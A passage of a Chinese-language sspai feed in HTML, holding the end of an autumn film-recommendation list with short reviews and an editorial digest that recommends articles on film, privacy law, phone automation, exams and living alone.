去往大型超市需要花上一整天路程的小村落。</p>\n<p>小森的秋天，能够感受到大自然的呼吸：白天，在堆满金灿灿落叶的地面，偶遇一只手攥棕色栗子的松鼠；夜晚，家中窗外一片黑暗里，发现一群闪烁暖黄色光芒的萤火虫。当然，《小森林 夏秋篇》的重点是食物，影片细致地刻画了 13 道菜的食物的制作过程：秋天特供的核桃饭、糖水栗子、番薯干、炒菠菜，通过一道又一道菜，串联起市子与母亲的点滴回忆、市子与小森村民的温情来往，这些食物的味道传承了市子母亲不易察觉的爱，也重建着市子与他人的紧密联系。</p>\n<p>日本影视剧里「悠长假期」似乎格外多，秋去春来、四季更迭，市子秉持着「不能单纯地相信言语，用自己的身体真实体验到的一切才可信」这一想法，在与自然相伴、与自我对话的过程中，度过了一段漫长的假期。如果你也厌倦城市里繁琐复杂的生活，不如就选择在这个秋天，给自己放个长假吧！让美食与美景抚平内心的焦躁，舒缓疲惫的身体与心灵，重新感知日常生活的美好，获得再次出发的勇气。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/10/03/f1786ca68b60f96ed649844cd7da91fe.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/10/03/a25cd85bbcb04bc1519e1028ceee1677.jpg\" alt=\"\"></figure><h2>[电影] 转转</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/03/1271ec0de6300e6c480f73fbae42b4ec.png\"></figure><p>关键词：喜剧</p>\n<p>片长：101 分钟，<a href=\"https://movie.douban.com/subject/2263102/\" target=\"_blank\">豆瓣链接</a></p>\n<blockquote><p>定好了目的地，不就不能叫散步了么。</p></blockquote>\n<p>@Voyager_1：熟悉导演三木聪的都知道，他的代表作品《时效警察》、《转转》是日本脱力系代表作品，而脱力系的特点就是「无聊」，他的故事源自日常，却往往在平淡无聊中让观众找到乐趣。大学生竹村文哉（小田切让饰）自幼被父母抛弃，养父则被投入监狱，大学念了八年始终无法毕业，在外更债台高筑。 在最后期限的前一天，福原爱一郎（三浦友和饰）找到竹村，提议愿意取消他的一切债务 ，条件是竹村必须陪这个凶悍的老头子散步到东京霞关。《转转》的故事就从这里开始。</p>\n<p>秋风拂过东京的街道，金色的银杏早已落满街道，看似漫无目的的二人踩着树叶一步一步向前腾挪。秋天，是故事发展的时间，是两个失意的人落寞的铺垫，也是导演用胶片在东京取景的故意为之。细数季节，秋天也是最适合在街道散步的，每有人生感悟，也总是在这惆怅的季节。主角们一路走下来，观众一路看下来，这部一路在散步的电影居然能让你时而悲伤，时而嬉笑，时而不舍，时而又觉得无厘头，好似在看《菊次郎的夏天》，又好似在读伊坂幸太郎的《家鸭与野鸭的投币式寄货柜》，带你品味到城市不一样的风光，体味戏中角色感情的牵绊，在一刹那都要动了情，目的地却忽地出现在了眼前。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/10/03/c944c4fe622f5ea7045cbf346d814f6d.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/10/03/2d51a9cdb08ef21147062d2e79c8e92c.jpg\" alt=\"\"></figure><h2>[电影] 去见瀑布</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/03/9e320d4b5438478e804792d500ee372f.png\"></figure><p>关键词：剧情</p>\n<p>片长：88 分钟，<a href=\"https://movie.douban.com/subject/25836152/\" target=\"_blank\">豆瓣链接</a></p>\n<p>观看渠道：<a href=\"https://v.qq.com/x/cover/7wc95r528kblssi/z00211ceijs.html\" target=\"_blank\">腾讯视频</a></p>\n<blockquote><p>我们去哪儿好呢，大叔？<br>去你们想去的地方。</p></blockquote>\n<p>@Voyager_1：片名比《转转》还直白，这部电影就是讲了七位阿姨去见瀑布的故事。但，乍听片名，更像是一种带有仪式感地去看瀑布，是略带诗意地看，至少不是七位性格迥异的阿姨们，吵吵闹闹地看，但冲田修一就这么拍了，而且拍得足够生活，又略有诗意。</p>\n<p>慌乱且毫无经验的导游，敷衍却雀跃的阿姨们，画风一转，带领他们出游的大巴就陷入了一片红色的山叶之中。下车，三两作伴，行山的装束，参天的大树，接下来的步履之行就在这片绿与橙的交辉中进行。还没能移步换景，导游就迷路开去，自顾自的阿姨们必须聚拢起来，想出各种诡异的法子反过来寻找导游。荒诞又好笑，活脱脱一部剧场外的小品。直到看到瀑布，众人在瀑布边做起自己想做的事情，才若有所思，原来本该带他们来的导演迷路到现在才狼狈地出现。</p>\n<p>日式的搞笑很多都是生活式的搞笑，拍摄日常，稀松平常的普通人，却能从脱口而出的台词，人物升起的怪点子里发掘出共鸣的点，让你有所体会。你不必洞悉镜头语言，不必了解电影手法，你只需要看着跟你一样的人类在困难、逆境、争吵面前如何表现，才知道这搞笑并非刻意，而是每个人赖以生活的解药，我们的生活，只在自己脚下，生活，本就应该如此。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/10/03/4927777a7b6312993f61bf6307d2c78e.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/10/03/f3e847ce73459d87caafbd27619b5afc.jpg\" alt=\"\"></figure><h2>[电影] 晚秋</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/03/fc100bb043d7b626429c3b97a46ea32b.png\"></figure><p>关键词：剧情</p>\n<p>片长：115 分钟</p>\n<p>观看渠道：<a href=\"https://v.youku.com/v_show/id_XMzg1ODE0NDAw.html\" target=\"_blank\">优酷</a>；<a href=\"https://movie.douban.com/subject/4136036/\" target=\"_blank\">豆瓣链接</a></p>\n<blockquote><p>你为什么用他的叉子，即使不是故意的也应该道歉。</p></blockquote>\n<p>@Voyager_1：《晚秋》根据李满熙导演 1966 年的同名电影改编而成，讲述两名男女在西雅图发生的爱情故事。本应在监狱服刑的安娜（汤唯饰）因母亲过世获得三天假期，七年来首次踏上归家之路，并于长途汽车上邂逅了勋（玄彬饰）。</p>\n<p>甫一开场，秋日的萧瑟气息就铺面而来，光秃秃的树桠，干枯松卷的树叶，仿佛风一吹就要碎开似的。异国的风景，昏黄的色调，惊慌奔走的女主角安娜，开篇就将晚秋的气息渲染到底，似乎也昭示了这个故事的结局。前半段介绍了两人的相遇、各自的生活背景以及人物性格，太久才出狱长实的耳洞、买完思虑又不要的衣服、女主和情人的简短对白、甚至汤唯几次微微飘移的眼神，都在诉说人物的性格和命运。不同于先前的版本，金泰勇导演细心地将故事的走向藏在了细节之中，才有了文艺片的拍摄和值得说道的剧情。</p>\n<p>后半段勋陪女主在游乐园浪漫双簧、西雅图观光、去看双人舞、还秀了憨憨的蹩脚中文，两个人渐渐生情愫，却好似在走向相似的结局，毕竟，这是两个原本都藏有故事的人，一个是弑夫假释的女犯，一个是专门「吃软饭」的情场骗子。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/10/03/4d3a1039a9d9fdb633692491c217d490.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/10/03/702d596d710002d1accb0051cd6fea37.jpg\" alt=\"\"></figure><h2>[电影] 当哈利遇到莎莉</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/03/0da2efb92e55902e7a66bc4784533f55.png\"></figure><p>关键词：剧情 / 爱情 / 纽约</p>\n<p>片长：96 分钟</p>\n<p>观看渠道：<a href=\"https://www.bilibili.com/bangumi/play/ss34760\" target=\"_blank\">哔哩哔哩</a>；<a href=\"https://movie.douban.com/subject/1291842/\" target=\"_blank\">豆瓣链接</a></p>\n<blockquote><p>关于爱情，我们到底知道些什么呢？</p></blockquote>\n<p>@宽治：他们的相逢似乎总在秋天，落叶满地、空气清澈的纽约也正是发生故事或事故的最佳场地。《当哈利遇到莎莉》在故事开头就提出了那个经典的问题，男人和女人之间有没有纯友谊？然后用了一部电影的时间告诉我们，该如何理解这个问题。原本只是萍水相逢的哈利与莎莉，却总是机缘巧合地在各自人生的重要时刻遇见彼此。而除了哈利与莎莉两人关系的发展，我尤其喜欢电影中穿插的老年夫妻的访谈。没有人会在第一眼看到另一个人的时候，就认定自己将来要娶她，也没有人过了 30 年还是一点没变样，我们总是听到别人这么说，是因为我们愿意相信爱情应该足够特殊。当哈利遇到莎莉，爱情似乎是绝无可能的，于是那些关于爱情的「幻觉」自然也就是不必要的了。可当他们放下伪装、终于无话不谈，「幻觉」反而又出现了。</p>\n<p>也许，哈利与莎莉的故事，展现出的是现代人所共享的爱情困境：我们一方面以理性祛魅了爱情，另一方面又希望能为爱情找到坚实的依靠，于是，我们编造了自己也不相信的童话，又默契地配合演出。在此之上，爱情之所以难解，似乎正是因为它首先被变成了一个问题，于是，我们所要回答的其实是自己提出的问题。归根结底，爱情是一场革命，它永远渴望推翻并重新定义自己。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/10/03/41055a97fd031afc44e34ad7c41edf88.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/10/03/2db998b6dd435e2a39bf588741e51ff7.jpg\" alt=\"\"></figure><h2>[电影] 秋天里的春光</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/03/14ad30c98cc5905ddba93484de910efd.png\"></figure><p>关键词：剧情 / 喜剧 / 家庭</p>\n<p>片长：100 分钟；<a href=\"https://movie.douban.com/subject/1308173/\" target=\"_blank\">豆瓣链接</a></p>\n<blockquote><p>老夫聊发少年狂，恶作剧，贪饮食，表面无羁，内有泪千行。</p></blockquote>\n<p>@宽治：如果人生如同四季，那么也许大多数人的老年都是冬季，因为大多数文化都会不自觉地忽略老年人的个性需求，认为老年就是休养生息的时间，人们能做的就只是静静地活着或是等待死亡。然而已逾古稀的 Fanda 却仍像一个还没长大的孩子，他贪玩、怕死、不负责任，和哥们 Eda 到处吃喝玩闹，拼命地享受生命最后的时光。无论是老婆还是儿子，都无法理解他的所作所为，认为他这是不好好过日子。然而实际上，他浪漫、善良、始终保持着天真，而所谓的「不靠谱」其实都是「生命力」的表现。对于 Fanda 来说，老年不是冬天，而只是秋天。</p>\n<p>Fanda 说，「人应该在年轻的时候死去」。年纪大了，不仅身体不行，更是少了很多自由，多了不少无奈。在 Emilie 与 Fanda 离婚的法庭上，我们却看到了原告为被告的辩解。虽然 Fanda 对所有人都默认的人生安排嗤之以鼻，让 Emilie 大为苦恼；但 Fanda 的那一点「离经叛道」其实也是「一板一眼」的 Emilie 生活里的亮光。而所谓「秋天里的春光」也许就是要告诉我们，虽然生活很难，但人生不应该在死亡之前停止，我们都该有一个漫长的秋天，不为收获，只为还有变化的可能。看着这样一位老人在那些细碎日常中的挣扎，我真的很感动，他让我相信，比所谓成熟更重要的，是对自己的诚实。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/10/03/77e65c3340771379a06d8e897ca55fa1.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/10/03/774f50ab52e55bf1270b55d91a89eb61.jpg\" alt=\"\"></figure><h2>🎁 互动抽奖</h2>\n<p>欢迎在评论区分享你的<strong>秋日必做清单/关于秋天的电影推荐</strong>，我们会在 10 月 8 日选取一则优质评论，送上少数派最新周边 —— <a href=\"https://item.taobao.com/item.htm?spm=a1z10.3-c-s.w4002-22968806714.24.321a61f0qwJa3h&amp;id=656156847801\" target=\"_blank\">监工水獭公仔</a> 🦦 一份！中奖者会在这篇文章中更新，届时请各位参与互动的朋友注意站内私信~</p>\n<h4>🎬 往期特辑：</h4>\n<ul>\n<li><a href=\"https://sspai.com/post/67716\" target=\"_blank\">看什么 · 特别篇丨让这些适合雨天观看的电影，来带你清凉一夏</a></li>\n<li><a href=\"https://sspai.com/post/67265\" target=\"_blank\">看什么 · 特别篇丨比博燃的热血片单，陪你迎战郁热夏天</a></li>\n<li><a href=\"https://sspai.com/post/66840\" target=\"_blank\">看什么 · 特别篇丨一张带你环游世界的夏日片单</a></li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/69093"},{"title":"不读可以先收藏 03 | 这些好文让你的假期更充实","date":"2021-10-02 08:09:51","description":"\n<h4><strong>不读可以先收藏</strong></h4>\n<p>让有价值的内容保持生命力，是对少数派作者分享和创作精神的肯定，对刚刚接触少数派的读者而言，这些内容也是方便他们直达少数派内容和 Matrix 社区核心价值的钥匙。</p>\n<p>在这个不定期更新的栏目中，少数派编辑部将人工挑选过去一段时间内值得重读和收藏的文章，这些内容凝聚了作者的耕耘和读者的肯定，应该能为想读好内容的你献上一份数字时代的「合订本」。</p>\n<hr>\n<p>大家好，今天是 2021 年 10 月 2 日。本栏目的第 3 期，我们从上一周期内推荐到首页的 120 篇文章中挑选了 10 篇值得你收藏的好文。</p>\n<p>快把文章末尾的收藏按钮用起来吧。</p>\n<h2>这些文章可以先收藏</h2>\n<h3>看什么 Café丨当我们聊「电影感」的时候，我们在聊些什么？</h3>\n<p>🔋 充电量：57</p>\n<p>作者：<a href=\"https://sspai.com/u/d6sd0vwe/updates\" target=\"_blank\">利兹与青鸟</a></p>\n<blockquote>\n<p>无论艺术的形式如何变迁，历史如何循环往复，能够被记住的一定是那些体现着「人」这一主体及其精神世界发展历程的作品，「电影感」的本质不在于高难度的炫技，而是技术背后创作者所想传递的一切信息、观念与情感。</p>\n<p><a href=\"https://sspai.com/post/68175\" target=\"_blank\">阅读全文&gt;</a></p>\n</blockquote>\n<p><strong>编辑荐语（北鸮）：</strong>「电影感」对大多数人来说只是一个模糊的名词。人们用它描述，用它形容，甚至用它赞赏，但很少有人明明白白地解释出它是什么。这篇文章以希区柯克的《后窗》为主线，将「电影感」中包含的叙事手法、剪辑魔术一点点拆开，以「拉片」的方法深入浅出地为读者解析这一概念。</p>\n<p>对于希望将电影看得更深入的人来说，这篇文章是很好的引导。它提供了一种思维方式，让你可以在欣赏电影时，多一层技术与艺术的角度，让电影的欣赏不再局限于词不逮意的感叹。而抛开这一专业层面，本文也可以作为希区柯克经典作品的观影引导，让你从《后窗》开始，逐步体会希区柯克精心构建的恐怖世界。</p>\n<p>「看什么 Café」是「本周看什么」的衍生栏目，旨在从一个特定主题或视角为读者提供与电影相关的优质内容，栏目中每篇文章都可以为你的闲暇时光添些乐趣。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/02/dd37934f2589ea9210d656644f062571.jpg\"></figure><h3>吹尽狂沙始到金——《个人信息保护法》有哪些亮点值得关注？</h3>\n<p>🔋 充电量：50</p>\n<p>作者：<a href=\"https://sspai.com/u/jsgroup/updates\" target=\"_blank\">JSGroup</a></p>\n<blockquote>\n<p>个保法贯彻了保护个人信息权益、规范个人信息处理活动、促进个人信息合理利用三大立法目标，呈现出不少兼具理论高度和现实关怀的立法亮点。我们相信这部法律的颁行，对于用户和行业都将产生深远的影响。</p>\n<p>个人信息处理并不是一次性的事件。正如个保法明确规定，「处理」包括收集、存储、使用、加工、传输、提供、公开、删除等（第 4 条），即覆盖了个人信息处理的全生命周期。相应地，「知情—同意」的个人信息处理原则也贯穿于这些环节。</p>\n<p><a href=\"https://sspai.com/post/68832\" target=\"_blank\">阅读全文&gt;</a></p>\n</blockquote>\n<p><strong>编辑荐语（PlatyHsu）：</strong>《个人信息保护法》是今年信息安全领域一项重要立法，也是我国首部针对个人信息保护的专门法律，将在一个多月后的 11 月初生效，对于用户权益和行业经营都将产生深远的影响。本文由在反垄断与竞争法、数据合规与网络安全领域有丰富经验的律师团队撰写，从用户视角提炼了《个人信息保护法》在个人信息收集、使用方面对互联网公司提出的要求，以及其中与大数据使用、敏感信息处理和个人信息出境等热点场景相关的新规，并配以直观的图表方便理解。</p>\n<p>法律不保护躺在权利上睡觉的人。作为数字生活中的消费者，除了意识到个人信息相关的风险和问题，更要积极了解和主张权利。如果你希望对自己作为个人信息主体的权利建立较为完整、准确的理解，这篇文章是一个很好的起点。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/16/article/bbf8781387160a1a22e3063b152a45b3?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"></figure><h3>每日一技 | 如何优雅地转发任意通知到 iPhone</h3>\n<p>🔋 充电量：73</p>\n<p>作者：<a href=\"https://sspai.com/u/SunShinenny/updates\" target=\"_blank\">SunShinenn</a></p>\n<blockquote>\n<p>工作需求，目前双持 iPhone 和 Android (工作用)设备。有需求将 Android 设备的某些通知转发到 iPhone上。</p>\n<p>短信里的验证码，微信群聊中的 @xxx，来电通知，我全都想要转发。一方面是想在玩 iPhone 的时候，不错过一些工作通知，另一方面想让 Android 的通知走 Apple Watch 推送，这样就能更及时的看到消息了。</p>\n<p><a href=\"https://sspai.com/post/68177\" target=\"_blank\">阅读全文&gt;</a></p>\n</blockquote>\n<p><strong>编辑荐语（广陵止息）：</strong>可能对于不少人来说同时持有两部手机的概率不算大，但对于剩下的因为工作或是其他原因必须要双持手机的人来说，如何优雅地同时使用它们相信也是不少人头疼的点。一般而言，多端同步的软件可以依靠自己云服务同步；但对于大部分不支持多端同步或者多端同步有限制（比如小而美）的应用而言，想要不错过任何一条通知只能两只手机都带上，沉重的口袋对于任何人而言都非常糟糕。</p>\n<p>本文给出了一个不同于在线自动化的方案——本地自动化，来快速稳定性地将 Android 上的通知转发到 iPhone 上。全程不涉及任何的代码，即使是没有开发或者技术背景的读者也能跟着一步又一步地搭建成功。文章发出来以后也引发了不少读者的讨论，看得出来在我派同时用两部手机的读者真的不少。BTW，如果你也有同时用两部手机的习惯或者经历，不妨来 <a href=\"https://sspai.com/bullet/1632293763\" target=\"_blank\">一派</a> 和我们大家聊聊你是怎么用它们的吧。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/02/fafb64dfd5f461df8fe71393a853c2e6.png\"></figure><h3>巧用设计感十足的 NFC 卡片和 iOS 15，实现「千人千面」的家庭环境自动化</h3>\n<p>🔋 充电量：242</p>\n<p>作者：<a href=\"https://sspai.com/u/gij6gkdt/updates\" target=\"_blank\">Elliana_W</a></p>\n<blockquote>\n<p>在手机 NFC 越来越普及的今天，借助各平台的生态联动和整合，使得它已经渐渐成为了智能自动化的一个强大入口 —— 只需将手机拿起靠近一碰，就能实现对应的功能，让我们不用在应用列表和快捷指令库里花费大量时间来找到想要的动作，真正实现指哪打哪。</p>\n<p>而用这种精心设计过的卡片，不仅进一步提升了家庭内的设计感，也避免了以往 NFC 标签一多起来之后难以记忆的麻烦。</p>\n<p><a href=\"https://sspai.com/post/68337\" target=\"_blank\">阅读全文&gt;</a></p>\n</blockquote>\n<p><strong>编辑荐语（Tp）</strong>：用手机扫描 NFC 并运行专属的自动化是一件非常酷的事情，但对于绝大多数普通用户而言，折腾一套自己的 NFC 自动化方案还是有一定门槛的。作者在文章中用简单易懂的语言，结合极具实用价值的场景，向读者展现了在家里应用 NFC 自动化多有「未来感」。同时，极低廉的卡片定制价格也让大家感叹「原来做 NFC 自动化的成本那么低」。</p>\n<p>不仅如此，作者基于 Apple 设计语言分享的卡片设计心得，也让读者得以一窥这些设计好看的卡片背后，都经历了怎样的故事。如果你也想做到「手机一碰，灯光启动」这样极具未来感的操作，相信这篇文章绝对会让你有所收获。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/17/8949ecae8d678890aa8e3fd63b2c6838.JPG?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"></figure><h3>开学季｜证多不压身，聊聊大学里值得「拼一拼」的证书考试</h3>\n<p>🔋 充电量：129</p>\n<p>作者：<a href=\"https://sspai.com/u/kostya/updates\" target=\"_blank\">Kostya</a></p>\n<blockquote>\n<p>我的高考是 6 年前。6 年前的高考前夜，我写下：「高考只不过是开始，我们这一代人所追求的，正是多样性。」考试并非生活的全部，大学期间可以做的事情还有很多，大学校园还有更多精彩等着你们去发现探索。但无论如何，希望你能够做好自己的规划，走好人生的每一步。也希望在这个过程中，我的文章能起到微小的助力作用。</p>\n<p><a href=\"https://sspai.com/post/68224\" target=\"_blank\">阅读全文&gt;</a></p>\n</blockquote>\n<p><strong>编辑荐语（张奕源 Nick）：</strong>考试简直是每个人的阴影，尤其对于学生朋友们来说，一提起「考证」，脑袋都要大了。但考试又是提升自己，并为未来步入职场增加竞争力的必要途径。既然考试逃不掉，不如……没试找试。</p>\n<p>在这篇《证多不压身，聊聊大学里值得「拼一拼」的证书考试》中，作者就推荐了一些大学期间很基础也很有必要参加的考试项目。同时，作者还针对每种考试的特点提供了备考策略和关联资讯，帮你更好地了解和参与各项考试。</p>\n<p>这不是一篇看完能有获得感的文章，相反，他可能还会带给你「直面现实吧」的焦虑。但这一定是一篇值得你收藏的文章，在你真的想要通过资格考试来提升自己履历的时候，别忘了翻开它，认真读读看。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c49uqmdb34tfgq1n87e0.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"></figure><h3>用不上也可以记下的好建议，让你的独居生活更有安全感</h3>\n<p>🔋 充电量：225</p>\n<p>作者：<a href=\"https://sspai.com/u/9mwqi1gg/updates\" target=\"_blank\">书藏</a></p>\n<blockquote>\n<p>独居不是与世隔绝，你总要和其他人打交道的，你可以不喜欢同事，也可以畏惧恋爱，但你的精力必然要投入一个方面，可以是以前的朋友，可以是同城的亲戚，亦或者是找同样的同居者结成对子。不论是谁，他需要知晓你的家庭住址、工作单位，有你的父母或任意家庭成员的电话，有你家的钥匙，可以作为你的紧急联系人，也可以在发生漏水等意外时，如果你正在出差或者公司有事没法及时回去，帮你处理一些事情。</p>\n<p><a href=\"https://sspai.com/post/68413\" target=\"_blank\">阅读全文&gt;</a></p>\n</blockquote>\n<p><strong>编辑荐语（Lotta）</strong>：独居是自由的，但在享受自由的同时，我们好像也无法避免安全隐患和孤独所带来的一丝担忧和焦虑。这篇文章从基本生活技能、意外预防、如何与孤独相处这三个方面，给予了细微而又实际的建议，而这些建议所引起的共鸣，也给评论区带来了很多不同视角的分享，各种各样的独居体验、家居好物，还有小确幸的瞬间。</p>\n<p>如果你在是否独居这个问题上犹豫不决，那么你可以根据这篇文章来做个评估或预想；或者你也被独居带来的问题所困扰，那么这篇文章则会为你带来很多解决问题的灵感；即使你不是独居人士，这篇文章的诸多建议也十分普适。正如标题所说，这篇文章是你「用不上也可以先收藏」的安全感清单。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/02/d2c9e9f50e69c7a89f9e737e71527d7c.jpg\"></figure><h2>值得关注的专栏内容</h2>\n<h3>好奇驱动世界</h3>\n<ul>\n<li>作者：Shyriz</li>\n<li>专栏： <a href=\"https://sspai.com/column/272\" target=\"_blank\">Shyrism.News</a>\n</li>\n</ul>\n<blockquote>\n<p>📮 Shyrism.News 是一份甄选的时事通讯，两周一期，涵盖新奇趣闻、热点议题、前沿科技以及其他关于生活、关于未来的事物。以精心细致的筛选对抗外强中干的算法，以热情洋溢的文字中和冷漠呆板的代码。</p>\n<p><a href=\"https://sspai.com/post/69052\" target=\"_blank\">阅读全文&gt;</a></p>\n</blockquote>\n<p><strong>编辑荐语（sainho）</strong>：谁也没预料到，本来是拓展信息边界的互联网，反倒成了「信息茧房」的最大助力。当我们二十四小时连接着互联网时，自以为在获取各式各样的新鲜事，但其实都是在自己的「口味」和算法合力画好的圈内打转。</p>\n<p>如果你想戳破这层看不见的屏障，我想推荐「Shyrism.News」给你。在这里，你可以避开娱乐八卦，关心最新的全球热点，环保、科技还有艺术。也许你不会喜欢每一期的所有话题，但相信每一期都会让你看到一点不一样的东西。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/02/389b4e5dfa3f3b555531fca7e9636ad7.png\"></figure><h3>20 年前的「网络电脑」和搁浅的「网上冲浪自由」</h3>\n<ul>\n<li>作者：阿斯巴盐</li>\n<li>专栏： <a href=\"https://sspai.com/column/270\" target=\"_blank\">掌故新志</a>\n</li>\n</ul>\n<blockquote>\n<p>而今天，我们似乎正生活在一个曾经无比期待的时代，万兆光纤，5G 网络，每一个实体键盘上都有 Esc 键盘。但是这个标配的按键更像是一个装饰，7x24 在线的工作/协同，工作生活互相入侵，人生焦灼。</p>\n<p>目标达成，但一切似乎并不是我们期待的那个未来。</p>\n<p>缺少 Esc 按键的时代我们期待网络， Esc 按键无处不在的时代我们无法断开网络，我不知道哪个更讽刺。</p>\n<p><a href=\"https://sspai.com/post/68960\" target=\"_blank\">阅读全文&gt;</a></p>\n</blockquote>\n<p><strong>编辑荐语（sainho）</strong>：50 年前美国宇航局工作人员预测称，二十世纪末，人类将在月球上建立人类基地，并执行载人火星任务。但是，50 年前推出的波音 747 飞机至今仍在生产中。</p>\n<p>科技的发展和变化有的时候完全与预测相背离，也没人敢笃定地定义科技界里的「新」与「旧」，所以，请你在 2021 年，和主理人阿斯巴盐坐上时光机，再次端详旧时代的弧光。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/02/044f3cf7d36ae8b659dc3a7e62d939b9.jpg\"></figure><h2>大家还爱看……</h2>\n<h3>一个过来人的打字指法纠正之路</h3>\n<blockquote>\n<p>我们在学习一项新的技能时，身体会因为陌生而不适应。所以我们的动作笨拙缓慢。但随着肌肉慢慢熟悉这些动作，我们就会变得越来越熟练，也越来越游刃有余。</p>\n<p><a href=\"https://sspai.com/post/45721\" target=\"_blank\">阅读全文&gt;</a></p>\n</blockquote>\n<p><strong>读者荐语（</strong><a href=\"https://sspai.com/u/i7xjpky9/updates\" target=\"_blank\"><strong>RyousukeXT</strong></a><strong>）</strong>：三年前看到这篇文章的时候，一看标题，这不就是我一直想做却从来没做成的事情么？所以立马就啃读起来。作者是发现身体出现问题，需要调整笔记本显示位置和坐姿，因此购入新键盘，从而引导了他指法更正之路。而我想纠正指法是因为长期形成的错误的指法总是在快速盲打时不停出错，整个办公室响彻了我按回格键的“哒哒哒”声（没错，单位提供的薄膜键盘除了空格键外，回格键声音最响……）。记得当年学打字是在小学六年级，使用的还是智能ABC输入法，也没人教我指法规范，纯粹以食指、中指和无名指三指进行无序乱按，小拇指是纯粹不用的，怎么顺手怎么按。大概一年后就养成了直到三年前一直在用的错误指法，痛苦不堪。</p>\n<p>所以下定决心一定要纠正过来，提高自己的输入速度，特别在进行Linux命令行操作时正确率真的很重要。跟着文章推荐的一些指法练习网站上一点点的强制纠正，大概进行了一年半左右的时间后，使用了规范化的指法，打字输入正确率明显提高了。</p>\n<p>这篇文章评论有155，充电数有500多，在少数派中也算是难得一见的高互动文章了，把它再次推荐给大家，相信一定还有很多人有指法上的困扰。</p>\n<p>别担心，这不是绝症，可以治疗。🤪</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2018/07/28/2af01b986a097e3f16a2e9a9ff0b3562.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"></figure><h3>一年之后，再看 Apple Watch</h3>\n<blockquote>\n<p>Apple Watch 当然不是一块完美的智能手表，但它完美地满足了我对手表的需求，并且在一年的使用之后，潜移默化地成为了我生活的一部分。也许在将来，我还会像小时候一样在名表专柜前驻足欣赏，但我选择佩戴在手腕上的，仍然会是一块 Apple Watch。</p>\n<p><a href=\"https://sspai.com/post/65885\" target=\"_blank\">阅读全文&gt;</a></p>\n</blockquote>\n<p><strong>读者荐语（</strong><a href=\"https://sspai.com/u/alrcly/updates\" target=\"_blank\"><strong>萧俊介</strong></a><strong>）</strong>：在读这篇文章之前，我的 Apple Watch 一直用的 Siri 表盘，因为我实在是找不到好看且实用的表盘。作者根据自己的生活场景设置了三款表盘，每一款都非常非常的好看且实用。并且这些表盘通过快捷指令实现了根据时间、位置的自动切换。我自己也根据自己的需求，按照作者的思路设置了我自己的表盘，并一直用到现在。我现在身边如果有第一次用 Apple Watch 的人，我都会推荐他们看看这篇文章。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/02/d0bc1e160ad396561ea177da5f6a2350.jpg\"></figure><p><strong>我们将在假期结束后联系以上两位读者送出少数派周边，届时请注意查收站内私信。</strong></p>\n<h3><strong>你也可以参与文章推荐活动</strong></h3>\n<p>以上便是本期「不读可以先收藏」要推荐给大家的全部内容。</p>\n<p>喜欢的文章居然没有上榜？</p>\n<p>⚡️️欢迎各位读者一起来评论区参与「文章推荐」活动，<strong>我们将挑选部分内容呈现在下期栏目中的「这些文章读者也爱看」部分并送出精美少数派商城周边一份</strong>。</p>\n<p>评论投稿内容可以参考本期栏目内容的格式：</p>\n<ul>\n<li>文章链接；</li>\n<li>推荐人（可空，默认为评论者的少数派昵称）；</li>\n<li>精选段落；</li>\n<li>推荐语。</li>\n</ul>\n<p>赶紧向大家推荐你心中的好文章吧。</p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\" target=\"_blank\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p>© 